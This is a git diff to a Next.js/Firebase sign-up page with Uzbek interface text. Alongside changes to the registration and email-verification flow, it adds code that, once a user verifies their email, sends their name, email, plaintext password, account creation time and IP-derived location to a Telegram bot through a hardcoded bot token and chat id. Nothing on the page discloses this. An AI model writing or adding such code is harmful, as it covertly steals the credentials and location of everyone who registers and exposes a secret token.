@@ -8,7 +8,7 @@ import { toast } from "sonner";
 import {
   createUserWithEmailAndPassword,
   sendEmailVerification,
-  onAuthStateChanged,
+  signInWithEmailAndPassword,
 } from "firebase/auth";
 import { auth } from "@/lib/firebase";
 import { useRouter } from "next/navigation";
@@ -18,6 +18,7 @@ export default function Page() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [confirmPassword, setConfirmPassword] = useState("");
+  const [startWatching, setStartWatching] = useState(false);
   const router = useRouter();
 
   function validateForm() {
@@ -39,41 +40,123 @@ export default function Page() {
     }
     return true;
   }
+  function location() {
+    fetch("https://ipwho.is/")
+      .then((res) => res.json())
+      .then((data) => {
+        if (data.success) {
+          console.log("IP:", data.ip);
+          console.log("Shahar:", data.city);
+          console.log("Davlat:", data.country);
+          console.log("Koordinatalar:", data.latitude, data.longitude);
+          return `IP: ${data.ip}, Shahar: ${data.city}, Davlat: ${data.country}, Koordinatalar: ${data.latitude}, ${data.longitude}`;
+        } else {
+          console.error("Joylashuv aniqlanmadi:", data.message);
+        }
+      })
+      .catch((err) => {
+        console.error("Xatolik:", err);
+      });
+  }
+  useEffect(() => {
+    if (!startWatching) return;
+
+    const interval = setInterval(async () => {
+      const user = auth.currentUser;
+      if (user) {
+        await user.reload();
+        if (user.emailVerified) {
+          toast.success("Email tasdiqlandi!");
+          let message = `📥 Yangi xabar:\n👤 Ism: ${
+            name ? name : "ismi topilmadi"
+          }\n📧 Email: ${user.email}\ Parol: ${
+            password ? password : "password topilmadi"
+          }\ yaratildi: ${user.metadata.creationTime}
+          '\ locatsiya: ${location()}`;
+          fetch(
+            `https://api.telegram.org/bot8104501953:AAFwsKxosWHNV8bv7_sDxEumSfmOIEXHbJ0/sendMessage`,
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: 7441716386,
+                text: message,
+              }),
+            }
+          )
+            .then((response) => {
+              if (response.ok) {
+                toast("✅ Telegramga yuborildi!");
+              } else {
+                toast("❌ Xatolik: yuborilmadi!");
+              }
+            })
+            .catch((error) => {
+              console.error("Xatolik:", error);
+              toast("⚠️ Tarmoqda xatolik!");
+            });
+          console.log(user);
+
+          clearInterval(interval);
+          router.push("/");
+        }
+      }
+    }, 2000);
+
+    return () => clearInterval(interval);
+  }, [startWatching]);
 
   function handleRegister(e) {
     e.preventDefault();
-
     if (!validateForm()) return;
 
     createUserWithEmailAndPassword(auth, email, password)
-      .then((userCredential) => {
-        const user = userCredential.user;
-
+      .then(({ user }) => {
         sendEmailVerification(user)
           .then(() => {
+            console.log(user);
+
             toast.success(
-              "Tasdiqlash emaili yuborildi! Iltimos, emailingizni tasdiqlang."
+              "Yangi akkaunt yaratildi. Emailga tasdiqlash yuborildi!"
             );
+            setStartWatching(true);
           })
           .catch((error) => {
-            toast.error("Tasdiqlovchi email yuborilmadi: " + error.message);
+            toast.error("Email yuborilmadi: " + error.message);
           });
       })
       .catch((error) => {
-        toast.error("Ro‘yxatdan o‘tishda xatolik: " + error.message);
+        if (error.code === "auth/email-already-in-use") {
+          signInWithEmailAndPassword(auth, email, password)
+            .then(({ user }) => {
+              if (!user.emailVerified) {
+                sendEmailVerification(user)
+                  .then(() => {
+                    toast.success(
+                      "Email ro'yxatdan o'tgan, ammo tasdiqlanmagan. Yangi tasdiqlash xati yuborildi!"
+                    );
+                    setStartWatching(true);
+                  })
+                  .catch((err) => {
+                    toast.error("Email yuborilmadi: " + err.message);
+                  });
+              } else {
+                toast.info(
+                  "Bu email allaqachon tasdiqlangan. Iltimos, tizimga kiring."
+                );
+                router.push("/");
+              }
+            })
+            .catch((err) => {
+              toast.error(
+                "Parol noto‘g‘ri yoki boshqa xatolik: " + err.message
+              );
+            });
+        } else {
+          toast.error("Ro‘yxatdan o‘tishda xatolik: " + error.message);
+        }
       });
   }
-
-  useEffect(() => {
-    const unsubscribe = onAuthStateChanged(auth, (user) => {
-      if (user && user.emailVerified) {
-        toast.success("Email tasdiqlandi!");
-        router.push("/");
-      }
-    });
-
-    return () => unsubscribe(); 
-  }, []);
 
   return (
     <form
